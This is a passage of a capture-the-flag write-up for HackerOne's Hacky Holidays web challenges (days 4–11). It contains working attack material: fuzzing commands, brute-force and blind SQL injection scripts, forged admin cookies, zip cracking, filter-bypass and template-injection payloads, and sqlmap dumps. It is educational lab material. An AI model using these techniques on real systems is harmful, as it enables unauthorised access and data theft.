3        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
4        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
5        "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
6        "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
7        // truncated for brevity
8    ]
9}
The content looks like base64. Let's pop this into CyberChef to decode:
Code 895 Bytes
1[ 
2    {
3        "user":null, "cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
4    }, {
5        "user":null, "cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
6    }, {
7        "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043", "cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
8    }, {
9        "user":null, "cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
10    }
11]
Now we're cooking. Two things to note here, first, we have cookies, and second, we have a user ID, C7DCCE-0E0DAB-B20226-FC92EA-1B9043.
I tried to use the cookies to authenticate on the purchase page, but unfortunately the cookies look to be a bait and don't work.
Let's instead take a closer look at that other endpoint.
Request:
Code 23 Bytes
1GET /swag-shop/api/user
Code 42 Bytes
1{
2    "error": "Missing required fields"
3}
Hmm, looks like there's a parameter missing. Time to get fuzzy once more. This command will call the endpoint with every item in the parameter name word list as the query parameter until it finds a result with a non 400 Bad Request status code:
Code 182 Bytes
1$ ffuf -w burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user\?FUZZ\=1 -fc 400 -mc all
2
3uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
Okay, looks like uuid is the parameter that makes a well formed request. We do have an ID from before that we could put in as the value of the uuid.
Request:
Code 63 Bytes
1GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
Code 286 Bytes
1{
2    "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3    "username": "grinch",
4    "address": {
5        "line_1": "The Grinch",
6        "line_2": "The Cave",
7        "line_3": "Mount Crumpit",
8        "line_4": "Whoville"
9    },
10    "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
11}
Takeaways
You'll frequently encounter content encoded as base64 on the web. Protip: If the string starts with eyJ it is probably encoded JSON
Fuzzing is a technique that can be used to discover additional endpoints and how to use them
Day 5
Another day means another app! Today's challenge is Secure Login:
Try and find a way past the login page to get to the secret area.
<image_7>
I tried putting in admin/admin just to see what would happen.
<image_8>
This error message is actually poor security practice. Industry standards would return a more generic message like "Invalid Login". By saying specifically, "Invalid Username", the site is allowing us to determine whether or not a username we enter actually exists on the site.
I wrote a quick script for the Turbo Intruder Burp Suite extension to attempt logging in with all the usernames in a wordlist. It then makes a note if it can find one that returns a page that doesn't contain the text "Invalid Username":
Code 503 Bytes
1def queueRequests(target, wordlists):
2    engine = RequestEngine(endpoint=target.endpoint,
3                           concurrentConnections=5,
4                           requestsPerConnection=100,
5                           pipeline=False
6                           )
7
8    for word in open('C:/Users/user/dev/SecLists/Usernames/Names/names.txt'):
9        engine.queue(target.req, word.strip())
10
11
12def handleResponse(req, interesting):
13    if 'Invalid Username' not in req.response:
14        table.add(req)
The username access returned a page without Invalid Username and with an Invalid Password message instead. Now that we know a real username, we can attack the password field. This time around, we will look for a page that doesn't respond with "Invalid Password". Turbo Intruder script:
Code 520 Bytes
1def queueRequests(target, wordlists):
2    engine = RequestEngine(endpoint=target.endpoint,
3                           concurrentConnections=5,
4                           requestsPerConnection=100,
5                           pipeline=False
6                           )
7
8    for word in open('C:/Users/user/dev/SecLists/Passwords/Leaked-Databases/rockyou-50.txt'):
9        engine.queue(target.req, word.strip())
10
11
12def handleResponse(req, interesting):
13    if 'Invalid Password' not in req.response:
14        table.add(req)
15
Ok! computer is the password. Full request and response:
Request:
Code 62 Bytes
1POST /secure-login HTTP/1.1
2
3username=access&password=computer
Code 198 Bytes
1HTTP/1.1 302 Found
2Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D; expires=Thu, 17-Dec-2020 01:12:59 GMT; Max-Age=3600; path=/secure-login
URL decoded, the cookie we get is eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=. Let's put this in the browser as the value for a securelogin cookie, and see what happens when we refresh.
<image_9>
We are logged in now! Still, looks like this user isn't able to see very much. The cookie we set was base64 encoded, let's decode it to see if we can find anything interesting.
Decoded, we get {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. Well, admin being false doesn't do it for me. Let's make our own cookie with admin rights.
Code 155 Bytes
1{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
2// Apply base64
3eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
Ok, let's toss our superior cookie into the browser and refresh.
<image_10>
Obviously we are going to need to see what is in this zip file that isn't for us.
Code 134 Bytes
1$ unzip my_secure_files_not_for_you.zip 
2Archive:  my_secure_files_not_for_you.zip
3[my_secure_files_not_for_you.zip] xxx.png password:
Another password! Let's try attacking it with the common passwords wordlist we used before:
Code 103 Bytes
1$ fcrackzip -b -D -p rockyou.txt -u my_secure_files_not_for_you.zip
2
3PASSWORD FOUND!!!!: pw == hahahaha
Great password. When we type it in we are greeted by two files:
<image_11>
...not sure what to make of that.
flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Takeaways
If a login page differentiates between an invalid user and invalid password error message, you can determine whether or not users exist on a site
Cookies can sometimes be decoded and updated to make a server behave differently
Password protected zip files can be bruteforced
Day 6
Let's jump in!
Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
<image_12>
The URL structure (https://hackyholidays.h1ctf.com/my-diary/?template=entries.html) looks as though the server is rendering the user specified file. We may be able to find more files to render. Let's get fuzzy:
Code 319 Bytes
1$ ffuf -w raft-small-files.txt -u https://hackyholidays.h1ctf.com/my-diary/\?template\=FUZZ -fc 302 -mc all
2
3index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
4.                       [Status: 200, Size: 0, Words: 1, Lines: 1]
5_index.php              [Status: 200, Size: 689, Words: 126, Lines: 22]
Alrighty, let's access https://hackyholidays.h1ctf.com/my-diary/?template=index.php and see what happens:
Response:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
Awesome, we can see how the pages get rendered. The code gets the name of the file to render as the template query parameter. It then strips out any characters that aren't a letter, number, or period. Then it removes occurrences of admin.php. Then it removes occurences of secretadmin.php.
We can tell from the comments that secretadmin.php is the file we need to access. This will be a bit tricky though considering the text substitutions being made. To make this easier, I copy pasted the critical section of the code into a local editor until I could find a way around this. The key insight is realizing that you can structure your input such that after applying the substitutions you still have the keywords you need. For example, "adminadmin.php.php" run through the first filter gives you admin.php as an output.
With some fiddling, I found this string which works: secretadmin.phpadminsecretadmin.admin.phpphp.php. Let's see why this works line by line:
Code 345 Bytes
1<?php
2$page = 'secretadmin.phpadminsecretadmin.admin.phpphp.php';
3
4$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
5// $page = 'secretadmin.phpadminsecretadmin.admin.phpphp.php'
6$page = str_replace("admin.php","",$page);
7// $page = 'secretadminsecretadmin.php.php'
8$page = str_replace("secretadmin.php","",$page);
9// $page = 'secretadmin.php'
Querying https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.phpadminsecretadmin.admin.phpphp.php gives us:
Code 1.74 KiB
1<?php
2if( $_SERVER["REMOTE_ADDR"] == '127.0.0.1' ){
3?>
4<!DOCTYPE html>
5<html lang="en">
6<head>
7    <title>My Diary</title>
8    <meta charset="utf-8">
9    <meta http-equiv="X-UA-Compatible" content="IE=edge">
10    <meta name="viewport" content="width=device-width, initial-scale=1">
11    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
12</head>
13<body>
14<div class="container">
15    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
16    <h1 class="text-center">My Diary</h1>
17    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
18    <div class="row" style="margin-top:30px">
19        <div class="col-md-6 col-md-offset-3">
20            <div class="panel panel-default">
21                <div class="panel-heading">Pending Entries</div>
22                <div class="panel-body" style="padding:0">
23                    <table class="table" style="margin:0">
24                        <tr>
25                            <th>Date</th>
26                            <th>Event</th>
27                            <th class="text-center">Action</th>
28                        </tr>
29                        <tr>
30                            <td>23rd Dec</td>
31                            <td>Launch DDoS Against Santa's Workshop!</td>
32                            <td class="text-center"><input type="button" class="btn btn-danger btn-xs" value="Post"></td>
33                        </tr>
34                    </table>
35                </div>
36            </div>
37        </div>
38    </div>
39</div>
40</body>
41</html>
42<?php
43}else{
44    die("You cannot view this page from your IP Address");
45}
We found the secret diary entry, and the flag! flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Day 7
Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
<image_13>
There's only one campaign available, let's take a look:
<image_14>
Looks like there is some templating being used to display html fragments and variables. By clicking preview, we can see how it renders:
<image_15>
By using the "Create New" button, we can write our own template and preview it.
<image_16>
We can intercept the request and interact with the API directly.
Request:
Code 127 Bytes
1POST /hate-mail-generator/new/preview
2preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
Code 16 Bytes
1Hello Alice ....
From playing with the request a bit I could gather that the server is parsing preview_data as JSON, and then substituting anything in {{}} markers in preview_markup with the value of the JSON key of the same name. This behavior prevents us from doing a typical template injection with function calls in the {{}} markers.
There didn't seem to be any obvious attack here, I decided to fuzz once again.
Code 246 Bytes
1$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -fc 404 -mc all
2templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
3new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
Hmm, templates, you say? Let's take a look at that.
<image_17>
Well. We are going to need to take a look at that "admins only" header! Unfortunately, clicking any of these links gives a 403 Forbidden error.
Still, we saw in the example campaign that there is a way to render these files in emails. We can give it a try:
Request:
Code 161 Bytes
1POST /hate-mail-generator/new/preview
2preview_markup=Hello+{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
Code 64 Bytes
1You do not have access to the file 38dhs_admins_only_header.html
No dice. We could also try sending the template as part of the JSON to be substituted into the markup. This way the content may pass an initial security check while still rendering the content we want.
Request:
Code 164 Bytes
1POST /hate-mail-generator/new/preview
2preview_markup=Hello+{{name}}+....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
Code 350 Bytes
1Hello <html>
2<body>
3<center>
4    <table width="700">
5        <tr>
6            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
7        </tr>
8        <tr>
9            <td style="padding:20px 10px 20px 10px">
10                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4> ....
Flag captured! flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Day 8
The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!
<image_18>
The login page shows a generic "Username/Password Combination is invalid" which means we can't enumerate usernames like last time. The forum posts did show posts by a user named grinch and another named max. I tried to use a wordlist to find their passwords, but this seemed to be a dead end.
To the fuzzmobile!
Code 296 Bytes
1$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/forum/FUZZ
2
31                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
42                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
5phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
1 and 2 are links to subforums you can see from navigating the site. phpmyadmin is interesting though!
<image_19>
There really didn't seem to be any more content on the site. Time to look for information off the site!
I used a Google Dork to see if any of the source code was publicly:
<image_20>
One result, and it is about Grinch-Networks/forum! Perfect!
I looked through the commit messages to see if any caught my attention. small fix looked like a good place to start.
The diff had:
Code 280 Bytes
1    static public function read(){
2        if( gettype(self::$read) == 'string' ) {
3-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
4+            self::$read = new DbConnect( false, '', '','' );
5        }
6        return self::$read;
7    }
Cool, some database credentials. We can use this to get into phpMyAdmin.
<image_21>
I used https://crackstation.net/ to crack the hash of the grinch admin user. The saved value is an MD5 hash of the string BahHumbug. Now we can log into the main forum with the grinch credentials to see hidden posts.
<image_22>
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Takeaways
Commit histories can contain sensitive data.
Salt your fries and your passwords! Unsalted passwords are far easier to crack.
Day 9
Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
What's in store this time?
<image_23>
There's a big button to access the Admin area, but it requires a username and password. The main focus though is the quiz, where you can enter your name and then step through the pages.
<image_24>
When hunting for vulnerabilities, it's good to start by seeing how your input is able to change your target's output. I noticed right away the unusual stat of "There is X other player(s) with the same name as you!". I thought a bit about how that might be implemented on the server. Probably something like:
Code 69 Bytes
1query = "SELECT count(*) FROM users WHERE name = '" + userInput + "'"
If the server isn't sanitizing the input properly, it could be vulnerable to a SQL injection attack. To test this, I crafted a simple payload, setting the name to ' OR 1=1-- . If we are lucky, the server will process the request like:
Code 53 Bytes
1SELECT count(*) FROM users WHERE name = '' OR 1=1-- '
This would return the count of all records where either their name is '' or it is true that 1=1. Since 1 always equals itself, this would return all records. After clicking through the quiz page to get to the score, I got the result:
Code 108 Bytes
1' OR 1=1-- You Scored
20/3
3You're not evil at all!
4There is 187882 other player(s) with the same name as you!
Awesome! This confirms the vulnerability. This is a "blind" SQL injection because we can't see the database data directly, but we can infer information based on how the page returns. From here I tried to extract a little information:
How Many Columns Are In The Current Table?
This information is useful to know for when we run union queries later. I ran through the quiz using the following names
Code 292 Bytes
1test' ORDER BY 1-- # Returned 143 users with the same name
2test' ORDER BY 2-- # Returned 143 users with the same name
3test' ORDER BY 3-- # Returned 143 users with the same name
4test' ORDER BY 4-- # Returned 143 users with the same name
5test' ORDER BY 5-- # Returned 0 users with the same name
This means that we have 4 columns in the current table. Ordering by a nonexistent column is not valid.
What Is The User Table Named?
I had assumed it was named users, but doing a sanity test suggested otherwise:
Code 58 Bytes
1test' UNION SELECT 1,2,3,4 FROM users-- # Returned 0 users
Other common names like user, accounts, account were not working either. MySQL has a special database information_schema.tables which stores information about the other tables in the database. We can use the injection vulnerability to read this information character by character. My idea was to use names like the following:
Code 134 Bytes
1testerbtgsg54g45' union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary '<char>%'-- 
To explain, the first part of the query is a nonsense name that doesn't exist. We then do a UNION to select a table_name from the information schema. Note that we select 4 values in order to match the 4 columns of the table that is currently being searched. The last part is where we could put a letter and then a wildcard. Then we know that whichever letter returned "1 other player(s) with the same name as you!" would be the letter a table starts with. And we could go character by character.
Exfiltrating the Data
From here I wrote a script to find the table name and the username and password of the admin:
Code 1.59 KiB
1#!/usr/bin/env python3
2
3import requests
4import re
5import sys
6
7ENDPOINT = 'https://hackyholidays.h1ctf.com/evil-quiz/'
8LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'
9ALL_CHARS = LOWERCASE + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' + '-$_'
10table_name_exploit = "union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary "
11username_exploit = "union select 1, 2, 3, 4 from admin where username like binary "
12password_exploit = "union select 1, 2, 3, 4 from admin where password like binary "
13cookie = ''
14
15def process(exploit, charset=LOWERCASE):
16    accumulator = ''
17    while True:
18        for char in charset:
19            if run_exploit(exploit + f"'{accumulator}{char}%'"):
20                accumulator += char
21                break
22        print(f"Result: '{accumulator}%'")
23
24def run_exploit(exploit):
25    payload = build_payload(exploit)
26    name = requests.post(ENDPOINT, cookies=cookie, data = {'name': payload})
27    start = requests.post(ENDPOINT + 'start', cookies=cookie, data = {'ques_1': 0, 'ques_2': 0, 'ques_3': 0})
28    score = requests.get(ENDPOINT + 'score', cookies=cookie)
29    
30    success = int(re.search("There is ([0-9]+) other player\(s\) with the same name as you!", str(score.content)).groups()[0]) > 0
31    return success
32
33def build_payload(exploit):
34    return "testerbtgsg54g45' " + exploit + "-- "
35
36r = requests.get(ENDPOINT)
37cookie = { 'session': r.cookies['session'] }
38
39sys.argv[1] == 'TABLE_NAME' and process(table_name_exploit) # admin
40sys.argv[1] == 'USERNAME' and process(username_exploit)
41sys.argv[1] == 'PASSWORD' and process(password_exploit, charset=ALL_CHARS)
42
Running the thing:
Code 99 Bytes
1$ ./script.py TABLE_NAME
2Result: 'a%'
3Result: 'ad%'
4Result: 'adm%'
5Result: 'admi%'
6Result: 'admin%'
I put this table name into the username and password exploit strings. From here I could pull the login:
Code 385 Bytes
1$ ./script.py USERNAME  
2Result: 'a%'
3Result: 'ad%'
4Result: 'adm%'
5Result: 'admi%'
6Result: 'admin%'
7
8./script.py PASSWORD
9Result: 'S3creT_%'
10Result: 'S3creT_p%'
11Result: 'S3creT_p4%'
12Result: 'S3creT_p4s%'
13Result: 'S3creT_p4ss%'
14Result: 'S3creT_p4ssw%'
15Result: 'S3creT_p4ssw0%'
16Result: 'S3creT_p4ssw0r%'
17Result: 'S3creT_p4ssw0rd%'
18Result: 'S3creT_p4ssw0rd-%'
19Result: 'S3creT_p4ssw0rd-$%'
Logging in with the admin/S3creT_p4ssw0rd-$ credentials gives the flag:
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Day 10
You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
<image_25>
We don't have credentials to log in. Registering a new account takes us to a user page:
<image_26>
Sometimes when inspecting the HTML of webpages you can find some hidden information. Looks like Grinch forgot to delete a comment in the framework he was using on the main page:
Code 37 Bytes
1<!-- See README.md for assistance -->
Well if Grinch can see README.md, why shouldn't we? Downloading /signup-manager/README.md we get:
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
There's a bunch of information we can gather here. The default login was just a bait, but /signup-manager/signupmanager.zip can be downloaded! Unzipping the file we gain access to the source PHP files. Most importantly, index.php, which shows how our users are being saved. Let's look at a few key areas of the file:
index.php - Input Validation
Code 1.06 KiB
1$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
2if (strlen($username) < 3) {
3    $errors[] = 'Username must by at least 3 characters';
4} else {
5    if (isset($all_users[$username])) {
6        $errors[] = 'Username already exists';
7    }
8}
9$password = md5($_POST["password"]);
10$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
11if (strlen($firstname) < 3) {
12    $errors[] = 'First name must by at least 3 characters';
13}
14$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
15if (strlen($lastname) < 3) {
16    $errors[] = 'Last name must by at least 3 characters';
17}
18if (!is_numeric($_POST["age"])) {
19    $errors[] = 'Age entered is invalid';
20}
21if (strlen($_POST["age"]) > 3) {
22    $errors[] = 'Age entered is too long';
23}
24$age = intval($_POST["age"]);
25if (count($errors) === 0) {
26    $cookie = addUser($username, $password, $age, $firstname, $lastname);
27    setcookie('token', $cookie, time() + 3600);
28    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
29    exit();
30}
For the username, firstname, and lastname, the server deletes any character that isn't a number or letter, and then truncates to the first 15 characters.
For the password, the server saves the MD5 hash of the input. (Note for later that MD5 hashes have a length of 32 characters).
If the age passes the is_numeric check, and has a string length under 3, the integer value gets saved.
index.php - Saving a New User
Code 531 Bytes
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4    $line .= str_pad( $username,15,"#");
5    $line .= $password;
6    $line .= $random_hash;
7    $line .= str_pad( $age,3,"#");
8    $line .= str_pad( $firstname,15,"#");
9    $line .= str_pad( $lastname,15,"#");
10    $line .= 'N';
11    $line = substr($line,0,113);
12    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
13    return $random_hash;
14}
Once the inputs have been validated, they get saved to users.txt here as one line per user. The variables in the line get padded to specific lengths. The README file mentioned that if the last character is "Y" you are an admin. We can assume this 'N' that is hardcoded makes us a non admin.
An example line in users.txt could look like: hello##########7d793037a0760186574b0282f2f435e7ce9e931b3203a7f3723b512b7f0801d610#first##########last###########N
index.php - Fetching Users From The Database users.txt
Code 871 Bytes
1function buildUsers(){
2    $users = array();
3    $users_txt = file_get_contents('users.txt');
4    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
5        if( strlen($user_str) == 113 ) {
6            $username = str_replace('#', '', substr($user_str, 0, 15));
7            $users[$username] = array(
8                'username' => $username,
9                'password' => str_replace('#', '', substr($user_str, 15, 32)),
10                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
11                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
12                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
13                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
14                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
15            );
16        }
17    }
18    return $users;
19}
When you navigate to the page logged in, your user information gets plucked from users.txt via this method. We can see that the server expects everything to be defined nicely at the proper index offsets in the line. The padding characters get stripped, and very interestingly, index 112 determines whether or not the user was an admin. If we can get a Y to appear here, the system will think we are an admin.
Making the Exploit
The validation is set in a way that even if we use the maximum number of characters for every field, and make all the letter characters Ys, we still won't be writing to the index that determines if we are an admin. I ran the code locally to test this:
Code 209 Bytes
1$maximum_y = str_repeat('Y', 15);
2$user_str = addUser($maximum_y, md5('this will always be 32 characters'), "999", $maximum_y, $maximum_y);
3echo $user_str . PHP_EOL;
4echo 'Admin: ' . substr($user_str, 112, 1);
Output:
Code 122 Bytes
1YYYYYYYYYYYYYYY9328d34dc87490369be5eec81dd91850b789dbf9d91f073744ed55c765825ead999YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYN
2Admin: N
We need a way to trick the validation into letting us save just one extra chracter in our input to push the N away, and let us use our Y instead.
The age processing in the validation stood out to me because the data that gets saved isn't exactly the same as the data that gets validated. Pasting it again here:
Code 185 Bytes
1if (!is_numeric($_POST["age"])) {
2    $errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5    $errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
$_POST["age"] has our age as a string. is_numeric checks that it can be interpreted as an integer. We then check it's string length, and then save it as an integer. I looked at the documentation of is_numeric, and saw that it accepts a bunch of formats as numeric, such as binary, hexadecimal, or scientific notation. Running a few tests I found out that I could set my age to 1e3. This value passes the is_numeric check, has a string length of 3 which passes, but saves as it's integer value, 1000. This will give us the one character we need to push the pesky N away.
Running the Exploit
Request:
Code 108 Bytes
1POST /signup-manager/
2action=signup&username=q38&password=123&age=1e3&firstname=123&lastname=aaaaaaaaaaaaaaY
Code 149 Bytes
1HTTP/1.1 302 Found
2Set-Cookie: token=870fa22f8c9727d9e1b527499bb55457; expires=Mon, 21-Dec-2020 17:40:35 GMT; Max-Age=3600
3Location: /signup-manager/
Request:
Code 76 Bytes
1GET /signup-manager/ HTTP/1.1
2Cookie: token=870fa22f8c9727d9e1b527499bb55457
Code 650 Bytes
1<body>
2<div class="container" style="margin-top:20px">
3    <div class="text-center"><img src="/assets/images/grinch-networks.png" alt="Grinch Networks"></div>
4    <h1 class="text-center" style="margin:0;padding:0">Admin Area</h1>
5    <div class="row">
6        <div class="col-md-6 col-md-offset-3" style="margin-top:15px">
7            <div class="alert alert-info">
8                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
9                <p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
10            </div>
11        </div>
12    </div>
13</div>
14</body>
15</html>
Got the flag, flag{99309f0f-1752-44a5-af1e-a03e4150757d}, and the location of tomorrow's challenge /r3c0n_server_4fdk59.
Day 11
We're getting into the depths of the Grinch's schemes now.
<image_27>
The "Attack Box" button takes us to a login page. Presumably we gain the login details by completing this challenge.
Exploring the Site
Each of the albums displays some Santa sightings:
<image_28>
It is possible the hash parameter that is used to fetch the photos in that album is vulnerable to SQL injection. We could check manually like we did for day 9, but let's use sqlmap this time around.
Code 688 Bytes
1$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42'
2
3GET parameter 'hash' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
4sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
5---
6Parameter: hash (GET)
7    Type: boolean-based blind
8    Title: AND boolean-based blind - WHERE or HAVING clause
9    Payload: hash=3dir42' AND 2469=2469 AND 'eVQs'='eVQs
10
11    Type: UNION query
12    Title: Generic UNION query (NULL) - 3 columns
13    Payload: hash=-9115' UNION ALL SELECT NULL,NULL,CONCAT(0x7171767871,0x6652794752675962646d466752426364554549457a736577764752754f4c537877415a7363784e73,0x71627a7871)-- -
14---
Nice, the parameter is vulnerable! We can exploit this further to dump all the database tables:
Code 986 Bytes
1$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42' --threads=5 --dump
2
3Database: recon
4Table: photo
5[6 entries]
